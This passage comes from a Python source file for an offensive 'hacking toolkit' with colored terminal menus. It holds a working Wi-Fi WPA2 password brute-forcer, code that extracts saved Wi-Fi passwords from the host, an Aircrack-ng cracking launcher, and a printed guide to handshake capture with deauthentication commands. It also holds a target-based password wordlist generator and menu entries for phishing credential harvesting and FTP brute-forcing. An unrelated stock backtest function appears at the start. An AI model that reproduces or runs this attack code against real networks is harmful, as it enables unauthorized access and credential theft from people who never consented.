    if not all([ticker, start_date, end_date, initial_capital_str]):
        print(f"\n{Colors.RED}[!] All fields are required.{Colors.RESET}")
        return
        
    try:
        initial_capital = float(initial_capital_str)
    except ValueError:
        print(f"\n{Colors.RED}[!] Invalid initial capital.{Colors.RESET}")
        return

    print(f"\n{Colors.CYAN}[*] Fetching data for {ticker} from {start_date} to {end_date}...{Colors.RESET}")
    try:
        data = yf.download(ticker, start=start_date, end=end_date)
        if data.empty:
            print(f"\n{Colors.RED}[!] No data found for ticker '{ticker}' in the given date range.{Colors.RESET}")
            return
    except Exception as e:
        print(f"\n{Colors.RED}[!] Failed to download data: {e}{Colors.RESET}")
        return

    # Simple Moving Average (SMA) Crossover Strategy
    short_window = 40
    long_window = 100
    
    print(f"{Colors.CYAN}[*] Applying SMA Crossover Strategy (Short: {short_window}, Long: {long_window})...{Colors.RESET}")

    signals = pd.DataFrame(index=data.index)
    signals['signal'] = 0.0
    signals['short_mavg'] = data['Close'].rolling(window=short_window, min_periods=1, center=False).mean()
    signals['long_mavg'] = data['Close'].rolling(window=long_window, min_periods=1, center=False).mean()

    signals['signal'][short_window:] = np.where(signals['short_mavg'][short_window:] > signals['long_mavg'][short_window:], 1.0, 0.0)   
    signals['positions'] = signals['signal'].diff()

    # Backtesting
    positions = pd.DataFrame(index=signals.index).fillna(0.0)
    positions[ticker] = 100 * signals['signal']
  
    portfolio = positions.multiply(data['Adj Close'], axis=0)
    pos_diff = positions.diff()

    portfolio['holdings'] = (positions.multiply(data['Adj Close'], axis=0)).sum(axis=1)
    portfolio['cash'] = initial_capital - (pos_diff.multiply(data['Adj Close'], axis=0)).sum(axis=1).cumsum()
    portfolio['total'] = portfolio['cash'] + portfolio['holdings']
    portfolio['returns'] = portfolio['total'].pct_change()
    
    print("\n" + "="*70)
    print(f"{Colors.BOLD}Simulation Results:{Colors.RESET}")
    print(f"  - {Colors.WHITE}Initial Portfolio Value: ${initial_capital:,.2f}{Colors.RESET}")
    final_value = portfolio['total'][-1]
    print(f"  - {Colors.WHITE}Final Portfolio Value: ${final_value:,.2f}{Colors.RESET}")
    profit = final_value - initial_capital
    profit_color = Colors.GREEN if profit >= 0 else Colors.RED
    print(f"  - {Colors.WHITE}Total Profit/Loss: {profit_color}${profit:,.2f}{Colors.RESET}")
    returns = (final_value / initial_capital - 1) * 100
    print(f"  - {Colors.WHITE}Total Returns: {profit_color}{returns:.2f}%{Colors.RESET}")
    print("="*70)

    print(f"\n{Colors.CYAN}[*] Generating plot... (Close the plot window to continue){Colors.RESET}")
    try:
        fig = plt.figure(figsize=(14, 8))
        ax1 = fig.add_subplot(111, ylabel='Price in $')
        data['Close'].plot(ax=ax1, color='c', lw=2., label='Close Price')
        signals[['short_mavg', 'long_mavg']].plot(ax=ax1, lw=2.)
        ax1.plot(signals.loc[signals.positions == 1.0].index, signals.short_mavg[signals.positions == 1.0], '^', markersize=12, color='g', label='Buy Signal')
        ax1.plot(signals.loc[signals.positions == -1.0].index, signals.short_mavg[signals.positions == -1.0], 'v', markersize=12, color='r', label='Sell Signal')
        plt.title(f"{ticker} SMA Crossover Strategy ({short_window}/{long_window})")
        plt.legend()
        plt.show()
    except Exception as e:
        print(f"\n{Colors.RED}[!] Could not display plot: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Ensure you have a GUI environment to display the plot.{Colors.RESET}")

def phishing_menu():
    menu_map = {'1': ("Credential Harvester", credential_harvester_ui)}
    while True:
        display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ PHISHING MODULES ]===//{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Mainframe{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: menu_map[choice][1](); pause()
        elif choice == '9': return
        else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)

def web_recon_menu():
    menu_map = {'1': ("Subdomain Scanner", subdomain_scanner_ui), '2': ("Directory Buster", dir_buster_ui), '3': ("Whois Lookup", whois_ui)}
    while True:
        display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ WEB RECONNAISSANCE MODULES ]===//{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Mainframe{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: menu_map[choice][1](); pause()
        elif choice == '9': return
        else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)

def live_wifi_brute_force_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ LIVE WI-FI BRUTE-FORCER ]===//{Colors.RESET}\n")
    if not PYWIFI_INSTALLED:
        print(f"{Colors.RED}[!] pywifi library not found or failed to load.{Colors.RESET}")
        if PYWIFI_ERROR:
            print(f"{Colors.BLUE}[*] Error detail: {PYWIFI_ERROR}{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Fix: Run 'pip install pywifi' and 'pip install comtypes' (required for Windows).{Colors.RESET}")
        return

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    print(f"{Colors.BLUE}[*] Scanning for nearby networks...{Colors.RESET}")
    iface.scan()
    time.sleep(2)
    results = iface.scan_results()
    
    print(f"\n{Colors.PURPLE}Available Networks:{Colors.RESET}")
    if not results:
        print(f"{Colors.RED}[!] No Wi-Fi networks found. Ensure your Wi-Fi is turned on.{Colors.RESET}")
        return

    for i, network in enumerate(results):
        print(f" {Colors.PURPLE}[{i}]{Colors.WHITE} SSID: {network.ssid} (Signal: {network.signal}){Colors.RESET}")
    
    while True:
        choice = input(f"\n{Colors.BLUE}[+] Enter the NUMBER (Index) of the target Wi-Fi: {Colors.RESET}").strip()
        if choice.isdigit() and int(choice) < len(results):
            choice = int(choice)
            break
        elif "." in choice or choice.endswith(".txt"):
            print(f"{Colors.RED}[!] Error: You entered a filename, but I need the NUMBER (0, 1, 2...) from the list above.{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Invalid selection. Please enter a number from 0 to {len(results)-1}.{Colors.RESET}")

    wordlist = input(f"{Colors.YELLOW}[+] Path to Wordlist (Default: passwords.txt): {Colors.RESET}").strip()
    
    if not wordlist:
        wordlist = "passwords.txt"
    
    if not os.path.exists(wordlist):
        print(f"{Colors.RED}[!] Wordlist not found: {wordlist}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Tip: Create a text file with one password per line.{Colors.RESET}")
        return
    
    target_ssid = results[choice].ssid

    print(f"\n{Colors.CYAN}[*] Attempting to crack {target_ssid}...{Colors.RESET}")
    
    with open(wordlist, 'r', errors='ignore') as f:
        for password in f:
            password = password.strip()
            if len(password) < 8: continue
            
            sys.stdout.write(f"\r{Colors.WHITE}[*] Testing: {password:<20}{Colors.RESET}")
            sys.stdout.flush()
            
            profile = pywifi.Profile()
            profile.ssid = target_ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            
            iface.connect(tmp_profile)
            
            # Optimized wait logic: check status every 0.1s up to 2.5s
            start_time = time.time()
            found = False
            while time.time() - start_time < 2.5:
                if iface.status() == const.IFACE_CONNECTED:
                    found = True
                    break
                time.sleep(0.1)
            
            if found:
                print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Password Found: {password}{Colors.RESET}")
                return
            else:
                iface.disconnect()
    print(f"\n{Colors.RED}[!] Attack finished. No password found.{Colors.RESET}")

def wifi_auditor_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ WIRELESS SECURITY AUDITOR ]===//{Colors.RESET}\n")
    print(f" {Colors.PURPLE}[1]{Colors.WHITE} Extract Saved Wi-Fi Passwords (Local Host){Colors.RESET}")
    print(f" {Colors.PURPLE}[2]{Colors.WHITE} Live Wi-Fi Brute-Force (Native Python){Colors.RESET}")
    print(f" {Colors.PURPLE}[3]{Colors.WHITE} WPA/WPA2 Handshake Attack (Aircrack-ng Required){Colors.RESET}")
    print(f" {Colors.PURPLE}[4]{Colors.WHITE} Handshake Capture & Cracking Guide{Colors.RESET}")
    print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Network Menu{Colors.RESET}\n")
    
    choice = input(get_prompt())
    
    if choice == '1':
        print(f"\n{Colors.CYAN}[*] Extracting saved Wi-Fi profiles...{Colors.RESET}\n")
        if os.name == 'nt': # Windows
            try:
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                for i in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                        print(f" {Colors.GREEN}[+] SSID: {Colors.WHITE}{i:<20} {Colors.GREEN}Password: {Colors.WHITE}{results[0] if results else '[OPEN]'}{Colors.RESET}")
                    except subprocess.CalledProcessError:
                        print(f" {Colors.RED}[!] Could not retrieve key for {i}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        else: # Linux
            path = "/etc/NetworkManager/system-connections/"
            if os.path.exists(path):
                try:
                    for filename in os.listdir(path):
                        with open(os.path.join(path, filename), 'r') as f:
                            content = f.read(); ssid = re.findall(r'id=(.*)', content); psk = re.findall(r'psk=(.*)', content)
                            if ssid: print(f" {Colors.GREEN}[+] SSID: {Colors.WHITE}{ssid[0]:<20} {Colors.GREEN}Password: {Colors.WHITE}{psk[0] if psk else '[OPEN]'}{Colors.RESET}")
                except PermissionError: print(f"{Colors.RED}[!] Root privileges required.{Colors.RESET}")
            else: print(f"{Colors.RED}[!] NetworkManager path not found.{Colors.RESET}")

    elif choice == '2':
        live_wifi_brute_force_ui()

    elif choice == '3':
        print(f"\n{Colors.CYAN}[*] Checking for Aircrack-ng...{Colors.RESET}")
        try:
            subprocess.run(['aircrack-ng', '--help'], capture_output=True, check=True)
        except:
            print(f"{Colors.RED}[!] Aircrack-ng not found in PATH.{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Windows Users: Download from https://download.aircrack-ng.org/aircrack-ng-1.7-win.zip{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Extract and add the 'bin' folder to your System PATH to use Option 3.{Colors.RESET}")
            print(f"{Colors.CYAN}[*] PRO TIP: Use Option 2 for a Native Python attack that doesn't need Aircrack-ng!{Colors.RESET}")
            return

        cap_file = input(f"{Colors.YELLOW}[+] Path to .cap / .pcap handshake file: {Colors.RESET}")
        wordlist = input(f"{Colors.YELLOW}[+] Path to Wordlist: {Colors.RESET}")
        bssid = input(f"{Colors.YELLOW}[+] Target BSSID (Optional, leave blank): {Colors.RESET}")

        if not os.path.exists(cap_file) or not os.path.exists(wordlist):
            print(f"{Colors.RED}[!] File not found.{Colors.RESET}"); return

        print(f"\n{Colors.GREEN}[*] Launching Aircrack-ng attack...{Colors.RESET}")
        cmd = ['aircrack-ng', '-w', wordlist, cap_file]
        if bssid: cmd.extend(['-b', bssid])
        try: subprocess.run(cmd)
        except Exception as e: print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    elif choice == '4':
        print(f"\n{Colors.WHITE}--- AIRCRACK-NG HANDSHAKE CAPTURE GUIDE ---{Colors.RESET}")
        print(f" {Colors.CYAN}1. Monitor Mode:{Colors.RESET} airmon-ng start wlan0")
        print(f" {Colors.CYAN}2. Scan Networks:{Colors.RESET} airodump-ng wlan0mon")
        print(f" {Colors.CYAN}3. Capture:{Colors.RESET} airodump-ng -c [CH] --bssid [MAC] -w capture wlan0mon")
        print(f" {Colors.CYAN}4. Deauth (force handshake):{Colors.RESET} aireplay-ng -0 5 -a [BSSID] wlan0mon")
        
    elif choice == '9': return

def network_exploit_menu():
    menu_map = {
        '1': ("Network Scanner", network_scanner_menu),
        '2': ("FTP Brute-Force", ftp_brute_force_ui),
        '3': ("Wireless Security Auditor", wifi_auditor_ui)
    }
    while True:
        display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ NETWORK EXPLOITATION MODULES ]===//{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Mainframe{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: menu_map[choice][1](); pause()
        elif choice == '9': return
        else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)

def forensics_menu():
    menu_map = {'1': ("TShark Live Packet Capture", tshark_capture_ui), '2': ("ZIP Archive Cracker", zip_cracker_ui), '3': ("Spam Detector", spam_detector_ui)}
    while True:
        display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ FORENSICS & ANALYSIS MODULES ]===//{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Mainframe{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: menu_map[choice][1](); pause()
        elif choice == '9': return
        else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)

def wordlist_generator_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ QUICK WORDLIST GENERATOR ]===//{Colors.RESET}\n")
    filename = input(f"{Colors.BLUE}[+] Output filename (e.g., custom.txt): {Colors.RESET}")
    print(f"{Colors.WHITE}Enter keywords related to the target (name, birthday, pet, etc.), separated by commas:{Colors.RESET}")
    keywords = input(f"{Colors.BLUE}[>] Keywords: {Colors.RESET}").split(',')
    
    passwords = []
    for k in keywords:
        k = k.strip()
        if k:
            passwords.extend([k, k+"123", k+"2024", k+"2025", k+"!", k.capitalize(), k.upper()])
    
    with open(filename, 'w') as f:
        f.write('\n'.join(set(passwords)))
    
    print(f"\n{Colors.GREEN}[SUCCESS] Created {filename} with {len(set(passwords))} potential passwords.{Colors.RESET}")

def misc_menu():
    menu_map = {
        '1': ("Financial Analysis Simulator", financial_analysis_menu),
        '2': ("Quick Wordlist Generator", wordlist_generator_ui)
    }
    while True:
        display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ MISCELLANEOUS MODULES ]===//{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Mainframe{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: menu_map[choice][1](); pause()
        elif choice == '9': return
        else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)

def display_help():
    display_banner()
    print(f"{Colors.BLUE}{Colors.BOLD}//===[ SYSTEM DOCUMENTATION & USAGE GUIDE ]===//{Colors.RESET}\n")
    # --- CRYPTOGRAPHY ---
    print(Colors.PURPLE + "[1] CRYPTOGRAPHY" + Colors.RESET)
    print("  - " + Colors.BLUE + "Hash Cracker:" + Colors.RESET + " Cracks hashes using a mask attack (?l, ?u, ?d, ?s).")
    print("    " + Colors.WHITE + "Sample:" + Colors.RESET + " Hash for 'Test1' is '0cbc6611f5540bd0809a388dc95a615b', mask is '?u?l?l?l?d'.")
    print("  - " + Colors.BLUE + "Hash Generator:" + Colors.RESET + " Generates multiple hash types for a given text.")
    print("  - " + Colors.BLUE + "Base64 Util:" + Colors.RESET + " Encodes or decodes text using Base64.")
    print("-" * 70)
    # --- WEB RECON ---
    print(f"\n{Colors.PURPLE}[2] WEB RECONNAISSANCE{Colors.RESET}")
    print("  - " + Colors.BLUE + "Subdomain Scanner:" + Colors.RESET + " Finds subdomains using a wordlist.")
    print("  - " + Colors.BLUE + "Directory Buster:" + Colors.RESET + " Finds hidden files/directories on a web server.")
    print("  - " + Colors.BLUE + "Whois Lookup:" + Colors.RESET + " Gathers registration info for a domain.")
    print(f"  - {Colors.BLUE}Requirements:{Colors.RESET} 'pip install -r requirements.txt'")
    print("-" * 70)
    # --- NETWORK EXPLOITATION ---
    print(f"\n{Colors.PURPLE}[3] NETWORK EXPLOITATION{Colors.RESET}")
    print(f"  {Colors.BLUE}A. Network Scanner:{Colors.RESET}")
    print("    - Scans a target for open ports using Nmap or a basic TCP scan.")
    print("    - For a safe test, use target '127.0.0.1'.")
    print(f"  {Colors.BLUE}B. FTP Brute-Forcer:{Colors.RESET}")
    print("    - Attempts to log into an FTP server using a wordlist.")
    print(f"    - {Colors.RED}Warning:{Colors.RESET} Only use on servers you have explicit permission to test.")
    print("-" * 70)
    # --- FORENSICS & ANALYSIS ---
    print(f"\n{Colors.PURPLE}[4] FORENSICS & ANALYSIS{Colors.RESET}")
    print(f"  {Colors.BLUE}A. TShark Live Capture:{Colors.RESET} Captures live network traffic (requires TShark).")
    print(f"  {Colors.BLUE}B. ZIP Cracker:{Colors.RESET} Dictionary attacks a .zip file password.")
    print(f"  {Colors.BLUE}C. Spam Detector:{Colors.RESET} Analyzes text for spam characteristics.")
    print("-" * 70)
    # --- PHISHING ---
    print(f"\n{Colors.PURPLE}[5] PHISHING{Colors.RESET}")
    print(f"  {Colors.BLUE}A. Credential Harvester:{Colors.RESET} Sets up a fake login page to capture credentials.")
    print(f"    - {Colors.RED}Warning:{Colors.RESET} Use responsibly and only with explicit permission.")
    print("-" * 70)
    # --- MISCELLANEOUS ---
    print(f"\n{Colors.PURPLE}[6] MISCELLANEOUS{Colors.RESET}")
    print(f"  {Colors.BLUE}Financial Simulator:{Colors.RESET} Runs a trading simulation on historical stock data.")
    print(f"  - {Colors.BLUE}Requirements:{Colors.RESET} 'pip install yfinance matplotlib'")
    print(f"{Colors.WHITE}" + "=" * 70 + f"{Colors.RESET}")

def main_menu():
    menu_map = {
        '1': ("Cryptography", crypto_menu),
        '2': ("Web Reconnaissance", web_recon_menu),
        '3': ("Network Exploitation", network_exploit_menu),
        '4': ("Forensics & Analysis", forensics_menu),
        '5': ("Phishing", phishing_menu),
        '6': ("Miscellaneous", misc_menu),
        '7': ("System Documentation & Help", display_help),
    }
    while True:
        display_banner()
        print(f"{Colors.BLUE}{Colors.BOLD}Select primary module to engage:{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[0]{Colors.WHITE} Terminate Session{Colors.RESET}\n")
        try:
            choice = input(get_prompt())
            if choice in menu_map:
                name, func = menu_map[choice]
                func(); 
                if func.__name__ != "main_menu": pause()
            elif choice == '0': print(f"\n{Colors.PURPLE}Terminating session... Stay safe.{Colors.RESET}"); sys.exit(0)
            else: print(f"\n{Colors.RED}[!] Invalid command '{choice}'.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt: print(f"\n\n{Colors.RED}[!] Emergency shutdown sequence initiated.{Colors.RESET}"); sys.exit(0)

# =================================================================================================
# MAIN EXECUTION
# =================================================================================================

if __name__ == '__main__':
    if sys.platform.startswith('win'):
        multiprocessing.freeze_support()
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("Weaver-Class Toolkit v5.0")
    main_menu()
